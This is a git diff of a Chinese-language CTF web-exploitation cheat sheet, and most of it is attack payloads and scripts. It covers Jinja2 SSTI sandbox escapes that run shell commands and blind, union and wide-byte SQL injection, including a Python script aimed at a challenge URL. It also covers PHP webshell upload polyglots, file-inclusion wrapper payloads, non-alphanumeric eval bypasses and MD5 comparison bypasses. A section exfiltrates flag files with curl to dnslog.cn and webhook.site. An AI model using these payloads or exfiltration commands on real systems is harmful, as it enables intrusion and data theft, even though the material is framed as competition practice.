@@ -2,10 +2,8 @@
 
 
 
-# Python的Web框架Flask的SSTI模板注入+沙箱逃逸
-### 内置函数
-
-#### 查看内置函数组
+# Flask的SSTI模板注入沙箱逃逸
+## 1. 查看内置函数组
 
 ```python
 ().__class__.__base__.__subclasses__()
@@ -14,8 +12,6 @@
 ```python
 ().__class__.__bases__[0].__subclasses__()
 ```
-
-
 
 ```python
 getattr(().__class__.__base__, "__subclasses__")()
@@ -27,7 +23,7 @@ getattr(().__class__.__bases__[0], "__subclasses__")()
 
 找到函数`<class 'os._wrap_close'>`位于第`137`位
 
-#### 调用内置函数
+## 2. 调用内置函数
 
 ```python
 ().__class__.__base__.__subclasses__()[137].__init__.__globals__.popen("ls"+" "+"/").read()
@@ -45,8 +41,6 @@ getattr(().__class__.__bases__[0], "__subclasses__")()
 ().__class__.__bases[0]__.__subclasses__()[137].__init__.__globals__["popen"]("ls"+" "+"/").read()
 ```
 
-
-
 ```python
 exec("error=().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat'+' '+'/'+'f'+'l'+'a'+'g').read();raise Exception(f'{error}')")
 ```
@@ -55,13 +49,9 @@ exec("error=().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__
 exec("error=\"abc\";raise Exception("abc")")
 ```
 
-
-
 ```python
 {{lipsum.__globals__.os.popen('env').read()}}
 ```
-
-
 
 ```shell
 {% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
@@ -71,51 +61,51 @@ exec("error=\"abc\";raise Exception("abc")")
 
 # SQL注入
 
-### 常规注入
+## 1. 常规注入
 
-#### 确认注释类型
+### I. 确认注释类型
 
 - #
 - --
 - --+
 
-#### 测试漏洞存在
+### II. 测试漏洞存在
 
 ```sql
 ' or true#
 ```
 
-#### 测试字段数量
+### III. 测试字段数量
 
 ```sql
 ' order by 3#
 ```
 
-#### 查询数据库名称
+### IV. 查询数据库名称
 
 ```sql
 ' union select 1,2,table_schema from information_schema.tables#
 ```
 
-#### 查询数据表名称
+### V. 查询数据表名称
 
 ```sql
 ' union select 1,2,table_name from information_schema.tables where table_schema='news'#
 ```
 
-#### 查询字段名称
+### VI. 查询字段名称
 
 ```sql
 ' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
 ```
 
-#### 查询字段内容
+### VII. 查询字段内容
 
 ```sql
 ' union select all 1,2,fl4g from secret_table#
 ```
 
-#### 联表查询字段
+### VIII.联表查询字段
 
 ```sql
 ' union select all null,null,null from users #
@@ -123,9 +113,9 @@ exec("error=\"abc\";raise Exception("abc")")
 
 
 
-### 函数注入
+## 2. 函数注入
 
-#### 确认注释类型
+### I. 确认注释类型
 
 - #
 
@@ -133,37 +123,37 @@ exec("error=\"abc\";raise Exception("abc")")
 
 - --+
 
-#### 测试漏洞存在
+### II. 测试漏洞存在
 
 ```sql
 ' or true --+
 ```
 
-#### 测试字段数量
+### III. 测试字段数量
 
 ```sql
 ' order by 3 --+
 ```
 
-#### 查询数据库名称
+### IV. 查询数据库名称
 
 ```sql
 ' union select 1,2,database() --+
 ```
 
-#### 查询数据表名称
+### V. 查询数据表名称
 
 ```sql
 ' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db' --+
 ```
 
-#### 查询字段名称
+### VI. 查询字段名称
 
 ```sql
 ' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test_db' --+
 ```
 
-#### 查询字段内容
+### VII. 查询字段内容
 
 ```sql
 ' union select 1,2,flag from test_tb --+
@@ -171,9 +161,9 @@ exec("error=\"abc\";raise Exception("abc")")
 
 
 
-### 宽体注入
+## 3. 宽体注入
 
-#### 确认注释类型
+### I. 确认注释类型
 
 - #
 
@@ -181,43 +171,43 @@ exec("error=\"abc\";raise Exception("abc")")
 
 - --+
 
-#### 测试漏洞存在
+### II. 测试漏洞存在
 
 ```sql
 %81' or true#
 ```
 
-#### 测试字段数量
+### III. 测试字段数量
 
 ```sql
 %81' order by 3#
 ```
 
-#### 查询数据库名称
+### IV. 查询数据库名称
 
 ```sql
 %81' union select 1,2,table_schema from information_schema.tables#
 ```
 
-#### 查询数据表名称
+### V. 查询数据表名称
 
 ```sql
 %81' union select 1,2,table_name from information_schema.tables where table_schema='news'#
 ```
 
-#### 查询字段名称
+### VI. 查询字段名称
 
 ```sql
 %81' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
 ```
 
-#### 查询字段内容
+### VII. 查询字段内容
 
 ```sql
 %81' union select all 1,2,fl4g from secret_table#
 ```
 
-#### 联表查询字段
+### VIII. 联表查询字段
 
 ```sql
 %81' union select all null,null,null from users #
@@ -225,9 +215,9 @@ exec("error=\"abc\";raise Exception("abc")")
 
 
 
-### 布尔盲注
+## 4. 布尔盲注
 
-#### 确认注释类型
+### I. 确认注释类型
 
 - #
 
@@ -235,43 +225,46 @@ exec("error=\"abc\";raise Exception("abc")")
 
 - --+
 
-#### 测试漏洞存在
+### II. 测试漏洞存在
 
 ```sql
 ' or true#
 ```
 
-#### 测试字段数量
+### III. 测试字段数量
 
 ```sql
 ' order by 3#
 ```
 
-#### 查询数据库名称
+### IV. 查询数据库名称
 
 ```sql
 ' union select 1,2,table_schema from information_schema.tables#
 ```
 
-#### 查询数据表名称
+### V. 查询数据表名称
 
 ```sql
 ' union select 1,2,table_name from information_schema.tables where table_schema='news'#
 ```
 
-#### 查询字段名称
+### VI. 查询字段名称
 
 ```sql
 ' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
 ```
 
-#### 查询字段内容
+### VII. 查询字段内容
 
 ```sql
 ' union select all 1,2,fl4g from secret_table#
 ```
 
-#### 测试盲注函数
+### VIII. 测试盲注函数
+
+#### ① 字符盲注
+
 ```sql
 ' union select all null,null,null from users where length(null) >= 10 #
 ```
@@ -284,7 +277,25 @@ exec("error=\"abc\";raise Exception("abc")")
 ' union select all null,null,null from users where substr(null, 0, 4) == "flag" and substr(null, 4, 1) == "{" #
 ```
 
-#### 编写盲注脚本
+#### ② 数字盲注
+
+```sql
+1 and ascii(substr((select flag from flag_table limit 0,1),1,1))=109
+```
+
+```sql
+1 and ascii(substr((select flag from flag_table limit 0,1),2,1))=111
+```
+
+```sql
+1 and ascii(substr((select flag from flag_table limit 0,1),3,1))=101
+```
+
+```sql
+1 and ascii(substr((select(database()) limit 1,1),1,1)=80
+```
+
+### VIIII. 编写盲注脚本
 
 ```python
 import time
@@ -345,24 +356,99 @@ if __name__ == "__main__":
     
 ```
 
+```python
+import requests
+import fake_useragent
+from requests import Response
+
+request = requests
+session = requests.Session()
+
+"""
+Sync Get By Request
+@param uri uri
+@param params params
+@param data data
+@param headers headers
+"""
+def getByRequests(uri: str, params: dict = None, data: dict = None, headers = None) -> Response:
+    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
+    return request.get(url = uri, headers = headers, params = params, data = data)
+
+"""
+Sync Post By Request
+@param uri uri
+@param params params
+@param data data
+@param headers headers
+"""
+def postByRequests(uri: str, data: dict = None, params: dict = None, headers = None) -> Response:
+    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
+    return request.post(url = uri, headers = headers, params = params, data = data)
+
+"""
+Sync Get By Session
+@param uri uri
+@param params params
+@param data data
+@param headers headers
+"""
+def getBySession(uri: str, params: dict = None, data: dict = None, headers = None) -> Response:
+    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
+    return session.get(url = uri, headers = headers, params = params, data = data)
+
+"""
+Sync Post By Session
+@param uri uri
+@param params params
+@param data data
+@param headers headers
+"""
+def postBySession(uri: str, data: dict = None, params: dict = None, headers = None) -> Response:
+    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
+    return session.post(url = uri, headers = headers, params = params, data = data)
+
+url = "http://8080-4ba89100-2eab-436f-9ddb-4ed6c3df35b3.challenge.ctfplus.cn/?project="
+payload_database = f"1 and ascii(substr((select(database()) limit 1,1),"
+payload_table = f"1 and ascii(substr((select table_name from `information_schema`.`tables` where table_schema='ctf2' limit 1,1),"
+payload_column = f"1 and ascii(substr((select column_name from `information_schema`.`columns` where table_schema='ctf2' and table_name='secret_bids' limit 2,1),"
+payload_element = f"1 and ascii(substr((select bid_price from secret_bids limit 0,1),"
+payload_chosen = payload_element
+
+flag = False
+for i in range(1, 100):
+    if flag: break
+    payload_i = payload_chosen + f"{i},1))="
+    for j in range(33, 127):
+        payload_j = payload_i + f"{j}"
+        response = getByRequests(url + payload_j).text
+        if response.__contains__("YES"):
+            print(chr(j), end="")
+            break
+        if j == 126: flag = True
+
+
+```
+
+
 
 # 文件上传漏洞
 
-### 前端校验
+## 1. 前端校验
 
-#### 编写php文件
+### I. 编写php文件
 
 ```php
 <?=`ls`;
 ```
 
-#### 合成payload文件
+### II. 合成payload文件
 
 ```shell
 copy /b png.png + php.php payload.png
 ```
 
-#### BS抓包改后缀
+### III. BS抓包改后缀
 
 ```shell
 png -> php
@@ -370,25 +456,27 @@ png -> php
 
 
 
-### 后端校验
+## 2. 后端校验
 
-#### phtml
+### I. phtml
 
-##### 编写phtml文件
+#### 编写phtml文件
 
 ```
 <?=`ls`;
 ```
 
-#### php
 
-##### 编写php文件
+
+### II. php
+
+#### ① 编写php文件
 
 ```php
 <?=`ls`;
 ```
 
-##### 合成payload文件
+#### ② 合成payload文件
 
 ```shell
 copy /b png.png + php.php payload.png
@@ -396,49 +484,51 @@ copy /b png.png + php.php payload.png
 
 
 
-### 前后端校验
+## 3. 前后端校验
 
-#### phtml
+### I. phtml
 
-##### 编写phtml文件
+#### ① 编写phtml文件
 
 ```
 <?=`ls`;
 ```
 
-##### 合成payload文件
+#### ② 合成payload文件
 
 ```shell
 copy /b png.png + phtml.phtml payload.png
 ```
 
-##### BS抓包改后缀
+##### ③ BS抓包改后缀
 
 ```shell
 png -> phtml
 ```
 
-#### php
 
-##### 编写php文件
+
+### II. php
+
+#### ① 编写php文件
 
 ```php
 <?=`ls`;
 ```
 
-##### 合成payload文件
+#### ② 合成payload文件
 
 ```shell
 copy /b png.png + php.php payload.png
 ```
 
-##### 合成payload文件
+#### ③ 合成payload文件
 
 ```shell
 copy /b png.png + php.php payload.png
 ```
 
-##### BS抓包改后缀
+#### ④ BS抓包改后缀
 
 ```shell
 png -> php
@@ -448,9 +538,9 @@ png -> php
 
 # 文件包含漏洞
 
-### file协议
+## 1. file协议
 
-#### 本地穿梭
+### 本地穿梭
 
 ```shell
 ?include=file://[文件的绝对路径和文件名]
@@ -458,19 +548,39 @@ png -> php
 
 
 
-### php协议
+## 2. php协议
 
-#### 文件内容读取
+### I. 文件内容读取
 
 ```shell
 ?include=php://filter/convert.base64-encode/resource=[文件路径]
 ```
 
+### II 文件内容下载
+
+```shell
+?file=php://filter/zlib.deflate/resource=flag.php
+```
+
+```python
+import base64
+import zlib
+
+data = "lZBRS8JgFIbv/RUf0u0wHftIWvOu/zHXzMBQsqsiaC2zZW4VUiaTUsqpkVoQjbnVn/nOt6+r/YW2f1AXBw6873vehyMWauVaaqVUkbfRBkrvVlVlv3RYxHxewLkcJ8tZgVvFON6wkuV4Po+31gSMFUE9Sq+nVKVcRenNJAyLN7DHxL346Q8j/xKsKbUNpk1p1wx7p8TzqNFmehDaLeZoYnFPAmNC3FasgeFQvRH5D/Dk0NEJ7c7FusSGL7Cw4HwJVzo1DeKdiZm6RAKbHTdA+6TNG/o+oJ2vGCKTQez7ns4+6G0TXu+StsAOO+MEoTtnzgisa3RQ2SkiMFuhP4npSPAI1pwsn4nbDmcDmOmR30sOxc/4y/zHWpBSvw=="
+
+def b64_zlib_decode(b64_str: str) -> bytes:
+    raw = base64.b64decode(b64_str)
+    return zlib.decompress(raw, -15)
+
+if __name__ == "__main__":
+    print(b64_zlib_decode(data))
+```
 
 
-### ZIP协议
 
-#### 压缩文件内容读取
+## 3. ZIP协议
+
+### 压缩文件内容读取
 
 ```shell
 ?include=zip://[压缩包绝对路径]#[压缩包内文件]
@@ -478,15 +588,15 @@ png -> php
 
 
 
-### data协议
+## 4. data协议
 
-#### 执行命令
+### I. 执行命令
 
 ```shell
 ?include=data://text/plain,<?php phpinfo();?>
 ```
 
-#### 伪造文本
+### II. 伪造文本
 
 ```shell
 ?include=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
@@ -495,25 +605,27 @@ png -> php
 
 # MD5碰撞
 
-### 弱碰撞
+## 1. 弱碰撞
 
-#### 0e绕过
+### I. 0e绕过
 
-##### 适用
+#### ① 适用
 
 ```shell
 a == md5(a)
 ```
 
-##### 例子
+#### ② 例子
 
 ```shell
 0e215962017
 ```
 
-#### 长字符绕过
 
-##### 适用
+
+### II. 长字符绕过
+
+#### ① 适用
 
 ```shell
 a != b && md5(a) == md5(b)
@@ -523,7 +635,7 @@ a != b && md5(a) == md5(b)
 a !== b && md5(a) == md5(b)
 ```
 
-##### 例子
+#### ② 例子
 
 ```shell
 QNKCDZO
@@ -538,9 +650,9 @@ s214587387a
 
 
 
-#### 数组绕过
+### II. 数组绕过
 
-##### 适用
+#### ① 适用
 
 ```shell
 a != b && md5(a) == md5(b)
@@ -558,7 +670,7 @@ a != b && md5(a) === md5(b)
 a !== b && md5(a) === md5(b)
 ```
 
-##### 例子
+#### ② 例子
 
 ```shell
 a[] = 0
@@ -567,15 +679,17 @@ b[] = 1
 
 
 
-#### 单md5特定
+### III. 单md5特定
 
-##### 适用
+#### ① 字符
+
+##### (1) 适用
 
 ```shell
-md5(x)==y
+md5(x)=="y"
 ```
 
-##### 脚本
+##### (2) 脚本
 
 ```python
 import hashlib, random, string
@@ -591,17 +705,48 @@ while 1:
         
 ```
 
+#### ② 数字
+
+##### (1) 适用
+
+```shell
+md5(x)==y
+```
+
+##### (2) 脚本
+
+```python
+import hashlib, random, string
+from multiprocessing import Pool, cpu_count
+
+PREFIX = '0e'     # 想找别的就改这里
+DIGITS = True     # True=前缀后必须全数字(魔法哈希); False=只要前缀匹配即可
+A = string.ascii_letters + string.digits
+
+def f(_):
+    while True:
+        x = ''.join(random.choices(A, k=8))
+        h = hashlib.md5(x.encode()).hexdigest()
+        if h.startswith(PREFIX) and (not DIGITS or h[len(PREFIX):].isdigit()):
+            return x, h
+
+if __name__ == '__main__':
+    with Pool(cpu_count()) as p:
+        x, h = next(p.imap_unordered(f, range(cpu_count())))
+    print(f"md5({x}) === {h}  前缀={PREFIX!r} 纯数字={DIGITS}")
+```
 
 
-#### 双md5特定
 
-##### 适用
+### IV. 双md5特定
+
+#### ① 适用
 
 ```shell
 md5(md5(x))==y
 ```
 
-##### 脚本
+#### ② 脚本
 
 ```python
 import hashlib, random, string
@@ -619,11 +764,11 @@ while 1:
 
 
 
-### 强碰撞
+## 2. 强碰撞
 
-#### 碰撞绕过
+### I. 碰撞绕过
 
-##### 适用
+#### ① 适用
 
 ```shell
 (string)a != (string)b && md5(a) === md5(b)
@@ -633,7 +778,7 @@ while 1:
 (string)a !== (string)b && md5(a) === md5(b)
 ```
 
-##### 例子
+#### ② 例子
 
 ```shell
 psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2
@@ -657,33 +802,39 @@ M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%A
 
 # Http请求
 
-### 从某浏览器
+## I. 从某浏览器
 
-#### 例子
+### 例子
 
 ```shell
 User-Agent WLLM
 ```
 
-### 从某地址
 
-#### 例子
+
+## II. 从某地址
+
+### 例子
 
 ```shell
 X-Forwarded-For 127.0.0.1
 ```
 
-### 从某网址
 
-#### 例子
+
+## III. 从某网址
+
+### 例子
 
 ```shell
 Referer ?CTF
 ```
 
-### 从某事件
 
-#### 例子
+
+## IV. 从某时间
+
+### 例子
 
 ```shell
 Data Tue, 27 Aug 2024 05:00:00 GMT
@@ -693,7 +844,7 @@ Data Tue, 27 Aug 2024 05:00:00 GMT
 
 # Url编码
 
-### 规则
+## I. 规则
 
 ```python
 '%' + hex(ord(chr))
@@ -705,7 +856,7 @@ Data Tue, 27 Aug 2024 05:00:00 GMT
 - 转16进制
 - 去首"0x"然后首补'%'
 
-### 公式
+## II. 公式
 
 ```python
 def urlEncode(encodeStr: str) -> str:
@@ -727,19 +878,129 @@ def urlDecode(decodeStr: str) -> str:
 
 # 爬虫
 
-### 脚本
+## 脚本
 
 ```python
 import requests
 import fake_useragent
+from requests import Response
 
 request = requests
 session = requests.Session()
 
-def getByRequests(uri: str, params: dict = None, data: dict = None) -> str: return request.get(url = uri, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
-def postByRequests(uri: str, data: dict = None, params: dict = None) -> str: return request.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
-def getBySession(uri: str, params: dict = None, data: dict = None) -> str: return session.get(url = uri, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
-def postBySession(uri: str, data: dict = None, params: dict = None) -> str: return session.post(url = uri, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
+"""
+Sync Get By Request
+@param uri uri
+@param params params
+@param data data
+@param headers headers
+"""
+def getByRequests(uri: str, params: dict = None, data: dict = None, headers = None) -> Response:
+    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
+    return request.get(url = uri, headers = headers, params = params, data = data)
+
+"""
+Sync Post By Request
+@param uri uri
+@param params params
+@param data data
+@param headers headers
+"""
+def postByRequests(uri: str, data: dict = None, params: dict = None, headers = None) -> Response:
+    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
+    return request.post(url = uri, headers = headers, params = params, data = data)
+
+"""
+Sync Get By Session
+@param uri uri
+@param params params
+@param data data
+@param headers headers
+"""
+def getBySession(uri: str, params: dict = None, data: dict = None, headers = None) -> Response:
+    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
+    return session.get(url = uri, headers = headers, params = params, data = data)
+
+"""
+Sync Post By Session
+@param uri uri
+@param params params
+@param data data
+@param headers headers
+"""
+def postBySession(uri: str, data: dict = None, params: dict = None, headers = None) -> Response:
+    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
+    return session.post(url = uri, headers = headers, params = params, data = data)
+```
+
+```python
+import aiohttp
+import fake_useragent
+from aiohttp import ClientTimeout, ClientError, ClientResponse
+
+"""
+Async Get By Session
+@param uri uri
+@param params params
+@param data data
+@param headers headers
+@param session session
+@param timeout timeout
+@param attempts attempts
+@return: response
+"""
+async def async_get(uri: str, params: dict, data: dict, headers: dict = None, session: aiohttp.ClientSession = None, timeout: int = 60, attempts: int = 10) -> ClientResponse | None:
+    if headers is None:
+        headers = {"User-Agent": fake_useragent.UserAgent().random}
+    if session is None:
+        async with aiohttp.ClientSession() as clientSession: session = clientSession
+
+    for attempt in range(attempts):
+        try:
+            async with session.get(
+                    url=uri,
+                    params=params,
+                    data=data,
+                    headers=headers,
+                    timeout=ClientTimeout(total=timeout)
+            ) as response:
+                return await response
+        except ClientError as clientError:
+            if attempt + 1 == attempts:
+                print(f"{clientError}")
+    return None
+
+"""
+Async Post By Session
+@param uri uri
+@param params params
+@param data data
+@param headers headers
+@param session session
+@param timeout timeout
+@param attempts attempts
+@return: response
+"""
+async def async_post(uri: str, params: dict, data: dict, headers: dict = None, session: aiohttp.ClientSession = None, timeout: int = 60, attempts: int = 10) -> ClientResponse | None:
+    if headers is None:
+        headers = {"User-Agent": fake_useragent.UserAgent().random}
+    if session is None:
+        async with aiohttp.ClientSession() as clientSession: session = clientSession
+
+    for attempt in range(attempts):
+        try:
+            async with session.post(
+                    url=uri,
+                    params=params,
+                    data=data,
+                    headers=headers,
+                    timeout=ClientTimeout(total=timeout)
+            ) as response:
+                return await response
+        except ClientError as clientError:
+            if attempt + 1 == attempts:
+                print(f"{clientError}")
+    return None
 
 
 ```
@@ -748,7 +1009,7 @@ def postBySession(uri: str, data: dict = None, params: dict = None) -> str: retu
 
 # MD5
 
-### 脚本
+## 脚本
 
 ```python
 import hashlib
@@ -765,19 +1026,218 @@ def md5(content: str)->str:
 
 # 反弹Shell
 
-### Dnslog
+## I. Dnslog
 
-#### 公式
+### 公式
 
 ```shell
 curl `cat /f*`.ociqfw.dnslog.cn
 ```
 
-### Webhook
 
-#### 公式
+
+## II. Webhook
+
+### 公式
 
 ```shell
 curl https://webhook.site/#!/view/f9280e85-7baa-4f28-8689-4d20879c0792/`cat /f*`
+```
+
+
+
+## III. Ngrok
+
+### 公式
+
+```powershell
+python -m http.server 8080 --directory "C:\Users\probie\Desktop"
+```
+
+```cmd
+ngrok http 8080
+```
+
+
+
+# 零宽隐写
+
+## 公式
+
+```python
+s = """if ( "admin" == $_GET['cytcv'] && /*⁦⁩*/ "bmkfd⁩ncd" == $_GET['⁦fguyfnk⁩kef']){"""
+print(repr(s))
+```
+
+
+
+# Uni码转Url码
+
+## 公式
+
+```python
+import urllib.parse
+
+s = "\u2069"
+print(urllib.parse.quote(s))
+```
+
+
+
+# 魔术链
+
+## __toString()
+
+对象被当作字符串使用时触发。 触发场景：`echo $obj`、`print $obj`、字符串拼接、`strlen($obj)`、`file_exists($obj)` 等。 POP 链作用：常用跳板，把对象传入字符串上下文，继续向下触发其他 gadget。
+
+## __destruct()
+
+析构函数，对象引用计数归零、脚本结束、对象销毁时触发。 触发场景：unserialize 得到对象，脚本执行完毕；变量被 unset。 POP 链作用：**最常见 POP 入口**，整条链的起点。
+
+## __wakeup()
+
+unserialize () 恢复对象时自动调用。 触发场景：`unserialize()`执行阶段，反序列化重建对象后立即触发。 考点：CVE-2016-7124，序列化串中声明属性数大于真实属性数，可绕过__wakeup（PHP5<5.6.25 / PHP7<7.0.10）；PHP7.4 + 若同时存在__unserialize ()，优先执行__unserialize，不再执行__wakeup。
+
+## __unserialize()
+
+PHP7.4 + 新增，unserialize 时触发，接收数组参数。 优先级高于__wakeup，同类两个方法共存只执行__unserialize。
+
+## __sleep()
+
+`serialize()`序列化对象前触发。 返回数组，数组内元素为需要序列化保存的属性；用于清理资源。 POP 链一般不作为入口，少数题目用来修改序列化存储属性。
+
+## __invoke()
+
+对象被当作函数调用时触发。 触发场景：`$obj()`、`call_user_func($obj)`、`usort($arr,$obj)`。 POP 链作用：常用中间跳板，回调场景高频出现。
+
+## __call()
+
+对象实例中调用**不存在 / 不可访问**的方法时触发。 参数：第一个为方法名，第二个为参数数组。 触发场景：`$obj->notexist(1,2)`。 POP 链作用：非常核心跳板，调用不存在方法进入链，SoapClient 原生类 SSRF 就是利用此方法。
+
+## __callStatic()
+
+静态上下文调用不存在 / 不可访问的静态方法触发。 触发场景：`A::notexist()`。 POP 出现频率低于__call。
+
+## __get()
+
+读取**不存在 / 不可访问（private/protected）**属性时触发。 参数：要读取的属性名。 触发场景：`$obj->noexist`。 POP 链高频跳板，读取私有 / 不存在属性触发下一环。
+
+## __set()
+
+给不存在 / 不可访问属性赋值触发。 参数：属性名、赋值的值。 触发场景：`$obj->noexist = "xxx"`。
+
+## __isset()
+
+对不存在 / 不可访问属性执行`isset()`或`empty()`触发。 触发场景：`isset($obj->noexist)` / `empty($obj->noexist)`。
+
+## __unset()
+
+对不存在 / 不可访问属性执行 unset 触发。 触发场景：`unset($obj->noexist)`。
+
+## __construct()
+
+构造函数，`new 类名()`实例化对象时触发。 ⚠️ 序列化 / 反序列化**不会自动触发**，仅 new 新建对象才跑；POP 链一般不作为自动入口。
+
+## __clone()
+
+clone 克隆对象完成后触发。 触发场景：`$b = clone $a`；克隆后对新对象执行。
+
+
+
+# 无字母无数字绕过
+
+## 1. PHP
+
+### I. 例子
+
+```php
+<?php
+highlight_file(__FILE__);
+$code=$_GET['code'];
+if(preg_match('/[a-z0-9]/i',$code)){
+    die('hacker');
+}
+eval($code);
+```
+
+```shell
+用反码绕过
+```
+
+### II. 公式
+
+```php
+<?php 
+$payload=urlencode(~'eval($_POST[0]);');
+echo $payload;
+```
+
+```shell
+(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);
+```
+
+
+
+## 2. Python
+
+### I. 例子
+
+```python
+import re
+
+code = input('code: ')
+if re.search(r'[a-zA-Z0-9]',code):
+    return
+exec(code)
+```
+
+```shell
+用全角绕过
+```
+
+### II. 公式
+
+```python
+from pwn import *
+
+context.os = "linux"
+context.arch = "amd64"
+# context.log_level = "debug"
+
+r = remote("127.0.0.1", 10477)
+
+payload = "ｅｘｅｃ(ｉｎｐｕｔ())".encode()
+r.sendlineafter("code:".encode(), payload)
+
+cmd = f"import os; print(os.popen(\"{input()}\").read())".encode()
+r.sendline(cmd)
+
+r.interactive()
+r.close()
+```
+
+
+
+# 已知明文攻击
+
+## 公式
+
+```shell
+bkcrack -C flag.zip -c flag.txt -p m.txt -o 0
+5663cf28 b2646412 8783f79c
+
+bkcrack -C flag.zip -c flag.txt -k 5663cf28 b2646412 8783f79c -d flag.txt
+flag{}
+```
+
+
+
+# SUID
+
+## 公式
+
+```shell
+find / -perm -4000 2>/dev/null
+find / -user root -perm -4000 -print 2>/dev/null
 ```
 
